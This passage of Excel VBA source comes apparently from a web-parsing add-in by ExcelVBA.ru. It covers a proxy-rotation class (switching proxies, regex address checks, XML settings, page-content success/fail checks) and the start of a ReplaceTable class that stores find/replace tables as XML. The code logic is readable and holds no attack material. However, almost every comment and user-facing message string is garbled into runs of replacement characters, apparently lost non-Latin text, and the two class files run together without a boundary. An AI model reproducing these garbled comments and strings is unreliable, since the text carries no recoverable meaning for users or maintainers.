    ' |fffd||fffd||fffd||fffd| Force = TRUE, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| Force = FALSE, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    If Not Me.Enabled Then Exit Sub
    If H Is Nothing Then Set H = http    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    If Me.DoNotSwitch Then
        Me.ActiveProxy.Apply H
        Exit Sub
    End If
    
    On Error Resume Next
    Dim PreviousProxyAddress$, ProxyChanged As Boolean, NewProxy As ProxyServer
    PreviousProxyAddress$ = Me.ActiveProxy.Address
    
    Set NewProxy = Me.GetNextItem
    If NewProxy Is Nothing Then
        If TEST_ACTIONS_MODE Or Me.ShowPopup Then AddBalloon "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
        Exit Sub
    Else
        If Me.Reuse Then ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            NewProxy.Locked = False
            NewProxy.QueriesERR = 0
            NewProxy.QueriesOK = 0
        Else
            If NewProxy.Locked Then
                Me.Enabled = False
                If TEST_ACTIONS_MODE Or Me.ShowPopup Then AddBalloon "<b style='color: red;'>|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.</b>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.", bt_Warning
                Me.Apply H
                Exit Sub
            End If
        End If
    End If
    
    Set Me.ActiveProxy = NewProxy
    ProxyChanged = Force Or (NewProxy.Address <> PreviousProxyAddress$)
    
    If Not H Is wHTTP Then ProxyChanged = True    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| wHTTP (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    
    If ProxyChanged And Me.ReconnectOnSwitch Then ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 02.10.2019
        If H Is wHTTP Then
            Set wHTTP = New WinHttpRequest
            Set H = wHTTP
        Else
            Set H = New WinHttpRequest
        End If
    End If
   
    If ProxyChanged And (TEST_ACTIONS_MODE Or Me.ShowPopup) Then
        If NewProxy.Address <> PreviousProxyAddress$ Then
            AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| #" & ActiveProxy.Index & vbNewLine & "<span style='font-size: small;'>" & ActiveProxy.Address & "</span>", bt_Information
        Else
            If Me.ReconnectOnSwitch Then ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 02.10.2019
                AddBalloon "<span style='font-size: small;'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| IP |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Information
            Else
                AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & "<span style='font-size: small;'>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|.</span>", bt_Information
            End If
        End If
    End If
    If ProxyChanged Then Me.ActiveProxy.Apply H
End Sub

Function GetNextItem() As ProxyServer
    On Error Resume Next
    Dim CurrentIndex As Long, NewIndex As Long
    
    If Me.Items.Count = 0 Then
        If Not Me.GetMoreProxies Then Exit Function
    End If
    
    CurrentIndex = Me.ActiveProxy.Index
    NewIndex = CurrentIndex + 1
    If NewIndex > Me.Items.Count Then NewIndex = 1
    Set GetNextItem = Me.Items(NewIndex)
End Function

Function GetMoreProxies() As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser_NeedsMoreProxy
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd| FALSE |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    
    On Error Resume Next
    Dim err_msg$, ac&
    ' ac& - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ac& = Me.AvailableProxiesCount
    
    With Me.Parent.AASets
        If .Exists(ACTION_SET_NAME_MORE_PROXY$) Then
            .GetItemByName(ACTION_SET_NAME_MORE_PROXY$).Execute
            If Me.AvailableProxiesCount > ac& Then
                GetMoreProxies = True    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Else
                err_msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & ac& & ")"
            End If
        Else
            err_msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ACTION_SET_NAME_MORE_PROXY$ & "|fffd|"
        End If
    End With
    
    If Len(err_msg$) Then
        If TEST_ACTIONS_MODE Or Me.ShowPopup Then AddBalloon err_msg$, bt_Warning
    End If
End Function

Function AvailableProxiesCount() As Long    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    AvailableProxiesCount = Me.Items.Count
End Function

Function GetItemByName(ByVal Address$) As ProxyServer
    On Error Resume Next: Dim Proxy As ProxyServer
    For Each Proxy In Me.Items
        If Proxy.Address = Address$ Then Set GetItemByName = Proxy: Exit Function
    Next Proxy
End Function

Function GetItemByIndex(ByVal Index&) As ProxyServer
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function

Function DeleteItemByIndex(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function

Function DeleteItemByName(ByVal Address$) As Boolean
    On Error Resume Next: Dim Proxy As ProxyServer
    For Each Proxy In Me.Items
        If Proxy.Address Like Address$ Then Me.Items.Remove Proxy.Address
    Next Proxy
    Me.UpdateIndexes
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Sub UpdateFromList(ByVal ProxyList$)
    On Error Resume Next
    Dim arr, i&
    ProxyList$ = Replace(ProxyList$, vbNewLine, vbLf)
    arr = Split(ProxyList$, vbLf)
    
    Set Me.Items = New Collection
    For i = LBound(arr) To UBound(arr)
        If Len(Trim(arr(i))) Then Me.Add Trim(arr(i))
    Next i
End Sub

Function Add(ByVal AddressLine$) As ProxyServer
    On Error Resume Next
    Dim PR As ProxyServer, Address$
    Address$ = Split(Trim(AddressLine$))(0)
    If Not IsAddressCorrect(Address$) Then Exit Function
    
    Set PR = GetItemByName(Address$)
    If Not PR Is Nothing Then Set Add = PR: Exit Function
    
    Set Add = New ProxyServer
    With Add
        .Address = Address$
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add Add, Address$
    Me.UpdateIndexes
End Function

Function Exists(ByVal AddressLine$) As Boolean
    On Error Resume Next
    Dim PR As ProxyServer, Address$
    Address$ = Split(Trim(AddressLine$))(0)
    If Not IsAddressCorrect(Address$) Then Exit Function
    
    Set PR = GetItemByName(Address$)
    Exists = Not PR Is Nothing
    Set PR = Nothing
End Function

Function IsAddressCorrect(Address$) As Boolean
    On Error Resume Next: Dim ProxyPattern1$, ProxyPattern2$
    ProxyPattern1$ = "^(.+:.+@|)([01]?\d?\d|2[0-4]\d|25[0-5])\.([01]?\d?\d|2[0-4]\d|25[0-5])\.([01]?\d?\d|2[0-4]\d|25[0-5])\.([01]?\d?\d|2[0-4]\d|25[0-5]):[0-9]\d{0,4}$"
    ProxyPattern2$ = "^(.+:.+@|)([A-Za-z0-9.-_]+):[0-9]\d{0,4}$"
    With REGEXP
        .Pattern = ProxyPattern1$
        IsAddressCorrect = .test(Address$)
        .Pattern = ProxyPattern2$
        IsAddressCorrect = IsAddressCorrect Or .test(Address$)
    End With
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Me.Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1)
    For i = 1 To Items.Count
        arr(i - 1) = Items(i).Address
    Next i
    ArrayOfNames = arr
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To 1)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .Index
            arr(n, 1) = .Address
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ToList() As String
    On Error Resume Next
    Dim Proxy As ProxyServer
    For Each Proxy In Me.Items
        ToList = ToList & Proxy.ToText & vbLf
    Next
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, Proxy As ProxyServer
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        node.Attributes.setNamedItem(.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1
        node.Attributes.setNamedItem(.createAttribute("Reuse")).text = Abs(CInt(Me.Reuse))
        node.Attributes.setNamedItem(.createAttribute("SaveAddressList")).text = Abs(CInt(Me.SaveAddressList))
        node.Attributes.setNamedItem(.createAttribute("Attempts")).text = Me.Attempts
        node.Attributes.setNamedItem(.createAttribute("ShowPopup")).text = Abs(CInt(Me.ShowPopup))
        
        With node.appendChild(XML.createElement("Switch"))
            .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.SwitchInCountEnabled))
            .Attributes.setNamedItem(XML.createAttribute("InCount")).text = Me.SwitchInCount
            .Attributes.setNamedItem(XML.createAttribute("Reconnect")).text = Abs(CInt(Me.ReconnectOnSwitch))
        End With
        
        With node.appendChild(XML.createElement("CheckOptions"))
            .Attributes.setNamedItem(XML.createAttribute("URL")).text = Me.Check_URL
            .Attributes.setNamedItem(XML.createAttribute("HTMLfilter")).text = Me.Check_HTMLfilter
            .Attributes.setNamedItem(XML.createAttribute("Success")).text = Me.Check_SuccessMask
            .Attributes.setNamedItem(XML.createAttribute("Fail")).text = Me.Check_FailMask
        End With
        
        With node.appendChild(XML.createElement("Stats"))
            If Me.StatsFilename <> DEFAULT_STATS_FILENAME$ Then .Attributes.setNamedItem(XML.createAttribute("Filename")).text = Me.StatsFilename
            .Attributes.setNamedItem(XML.createAttribute("ClearInterval")).text = Me.StatsClearInterval
        End With
        
        If Me.SaveAddressList Then
            For Each Proxy In Me.Items
                node.appendChild Proxy.ExportToXML
            Next Proxy
        End If
    End With
    
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If
        
        Me.Enabled = CBool(Val(node.Attributes.getNamedItem("Enabled").text))
        Me.Reuse = CBool(Val(node.Attributes.getNamedItem("Reuse").text))
        Me.SaveAddressList = CBool(Val(node.Attributes.getNamedItem("SaveAddressList").text))
        Me.Attempts = Val(node.Attributes.getNamedItem("Attempts").text)
        Me.ShowPopup = CBool(Val(node.Attributes.getNamedItem("ShowPopup").text))
        
        With node.SelectSingleNode("Switch")
            Me.SwitchInCount = Val(.Attributes.getNamedItem("InCount").text)
            Me.SwitchInCountEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.ReconnectOnSwitch = CBool(Val(.Attributes.getNamedItem("Reconnect").text))
        End With
        
        With node.SelectSingleNode("CheckOptions")
            Me.Check_URL = .Attributes.getNamedItem("URL").text
            Me.Check_HTMLfilter = .Attributes.getNamedItem("HTMLfilter").text
            Me.Check_SuccessMask = .Attributes.getNamedItem("Success").text
            Me.Check_FailMask = .Attributes.getNamedItem("Fail").text
        End With
        
        With node.SelectSingleNode("Stats")
            If Len(Trim(.Attributes.getNamedItem("Filename").text)) Then Me.StatsFilename = .Attributes.getNamedItem("Filename").text
            If Val(.Attributes.getNamedItem("ClearInterval").text) > 0 Then Me.StatsClearInterval = Val(.Attributes.getNamedItem("ClearInterval").text)
        End With
        
        Dim subnode As IXMLDOMElement, Proxy As ProxyServer
        Set Me.Items = New Collection
        
        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set Proxy = New ProxyServer
            Set Proxy.Parent = Me
            Proxy.LoadFromXML subnode
            Set Proxy.Parent = Me
            Me.Items.Add Proxy, Proxy.Address
        Next
    End If
End Sub

Function PageContentOK(ByVal txt$) As Boolean
    On Error Resume Next
    Dim v, success As Boolean, fail As Boolean
    
    If Len(Trim(Me.Check_HTMLfilter)) Then
        txt = ApplyHTMLFilters(txt, Me.Check_HTMLfilter)
    End If
    
    If Len(Me.Check_SuccessMask) Then
        For Each v In Split(Render(Me.Check_SuccessMask), "|")
            If Len(Trim(v)) Then If txt$ Like "*" & Trim(v) & "*" Then success = True: Exit For
        Next
    End If
    
    If Len(Me.Check_FailMask) Then
        For Each v In Split(Render(Me.Check_FailMask), "|")
            If Len(Trim(v)) Then If txt$ Like "*" & Trim(v) & "*" Then fail = True: Exit For
        Next
    End If
    'If Trim(txt) = "" Then fail = True    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Select Case True
        Case success And fail: PageContentOK = False
            If TEST_ACTIONS_MODE Or Me.ShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.", bt_Attention, True
            
        Case (Not success) And fail: PageContentOK = False
            
        Case success And (Not fail): PageContentOK = True
            
        Case (Not success) And (Not fail): PageContentOK = Len(Trim(Me.Check_SuccessMask)) = 0    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End Select
End Function

Attribute VB_Name = "ReplaceTable"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ReplaceTable
' Author        : Igor Vakhnenko            Date: 15.09.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text

Public FileName As String

Public Name As String
Public arr As Variant
Public IsEmpty As Boolean
Public IsFormulaRT As Boolean

Public CompareMode As Long        ' 0 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 1 - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public ReplaceMode As Long        ' 0 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, 1 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public UseWildcards As Boolean

Private Sub Class_Initialize()
    IsEmpty = True
End Sub

Function ToArray() As Variant
    On Error Resume Next
    If Me.IsEmpty Then
        ReDim res(0 To 0, 0 To 4)
        res(0, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    Else

        ReDim res(0 To UBound(arr) + 4, 0 To 4)
        res(0, 1) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(0, 2) = CHOOSE(Me.CompareMode + 1, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        res(1, 1) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": res(1, 2) = CHOOSE(Me.ReplaceMode + 1, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        res(2, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(2, 2) = UBound(arr)

        res(4, 1) = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:": res(4, 2) = "|fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"

        For i = LBound(arr) To UBound(arr)
            res(4 + i, 0) = i
            res(4 + i, 1) = IIf(Me.UseWildcards And (arr(i, 1) = "*"), "<|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>", "|fffd|" & arr(i, 1) & "|fffd|")
            res(4 + i, 2) = IIf(arr(i, 2) = "", "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd|>", "|fffd|" & arr(i, 2) & "|fffd|")
        Next i
    End If
    ToArray = res
End Function

Sub Edit()
    On Error Resume Next: Err.Clear
    Dim sh As Worksheet: Set sh = Create_RT_editorNew(Me.Name)
    sh.Range("Header").Offset(1, 1).Select: sh.Range("Header").Offset(1, 0).Select
    sh.Shapes("ComboBox_CompareMode").OLEFormat.Object.value = Me.CompareMode + 1
    sh.Shapes("ComboBox_ReplaceMode").OLEFormat.Object.value = Me.ReplaceMode + 1
    sh.Shapes("CheckBox_UseWildcards").OLEFormat.Object.value = Me.UseWildcards
    AppActivate Application.Name
    Application.ScreenUpdating = True

    If Me.IsEmpty Then Exit Sub
    sh.Range("Header").Offset(1).Resize(UBound(arr), 2).value = arr
End Sub


Function Load(ByVal xmlPath$, ByVal Real_RT_name$) As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| XML
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, n&
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        If Not .Load(xmlPath$) Then
            Erase Me.arr
            Me.IsEmpty = True
            Me.Name = ""
            Exit Function
        End If

        Me.FileName = xmlPath$
        Set node = XML.SelectSingleNode("ReplaceTable")
        Me.Name = Real_RT_name$ 'node.Attributes.getNamedItem("Name").text
        Me.IsFormulaRT = False

        Me.CompareMode = Val(node.SelectSingleNode("CompareMode").text)
        Me.ReplaceMode = Val(node.SelectSingleNode("ReplaceMode").text)
        Me.UseWildcards = CBool(Val(node.SelectSingleNode("UseWildcards").text))

        Dim replacements As IXMLDOMNodeList, Replacement As IXMLDOMElement
        Set replacements = node.SelectNodes("Replacement")

        If replacements.Length = 0 Then
            Me.IsEmpty = True
        Else
            ReDim newarr(1 To replacements.Length, 1 To 2)
            For Each Replacement In replacements
                n = n + 1
                newarr(n, 1) = Replacement.Attributes.getNamedItem("Find").text
                newarr(n, 2) = Replacement.Attributes.getNamedItem("ReplaceWith").text
            Next
            Me.arr = newarr
            Me.IsEmpty = False
        End If
        Load = True
    End With
End Function

Function SaveAs(ByVal xmlPath$) As String
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")

    With XML
        .preserveWhiteSpace = True
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        Set node = .appendChild(.createElement("ReplaceTable"))
        node.Attributes.setNamedItem(.createAttribute("Name")).text = Me.Name
        node.Attributes.setNamedItem(.createAttribute("IsEmpty")).text = CBool(Me.IsEmpty)
        node.appendChild(.createElement("Version")).text = 2
        node.appendChild(.createElement("LastEditedBy")).text = IIf(Developer, "ExcelVBA.ru", HWID)

        node.appendChild(.createElement("CompareMode")).text = Me.CompareMode
        node.appendChild(.createElement("ReplaceMode")).text = Me.ReplaceMode
        node.appendChild(.createElement("UseWildcards")).text = Abs(CInt(Me.UseWildcards))

        If Not Me.IsEmpty Then
            For i = LBound(arr) To UBound(arr)
                If Len(arr(i, 1)) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    With node.appendChild(.createElement("Replacement"))
                        .Attributes.setNamedItem(XML.createAttribute("Find")).text = arr(i, 1)
                        .Attributes.setNamedItem(XML.createAttribute("ReplaceWith")).text = arr(i, 2)
                    End With
                End If
            Next i
        End If

        If Len(xmlPath$) > 0 Then .Save xmlPath$
        SaveAs = .XML
    End With
End Function

Sub Save()
    SaveAs FileName
End Sub

Sub Delete()
    On Error Resume Next: Err.Clear
    If MsgBox("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|?", _
              vbYesNo + vbQuestion + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
    Kill Me.FileName
End Sub

Function ImportReplacements(ByRef RT As ReplaceTable, Optional ByVal Description$)
    On Error Resume Next
    RTarr = RT.arr
    For i = LBound(RTarr, 1) To UBound(RTarr, 1)
        code$ = RTarr(i, 1)
        If Len(Description$) Then code$ = "{" & Trim(Replace(Replace(code$, "}", ""), "{", "")) & "}"
        Me.AddReplacement code$, IIf(Len(Description$), Description$, RTarr(i, 2))
    Next i
End Function

Sub AddReplacement(ByVal code$, Optional ByVal txt$, Optional ByVal Description$)
    On Error Resume Next: Err.Clear
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            If arr(i, 1) = code$ Then
                If Len(txt$) Then arr(i, 2) = txt$
                Exit Sub
            End If
        Next i

        ReDim newarr(LBound(arr, 1) To UBound(arr, 1) + 1, LBound(arr, 2) To UBound(arr, 2))

        For i = LBound(arr, 1) To UBound(arr, 1)
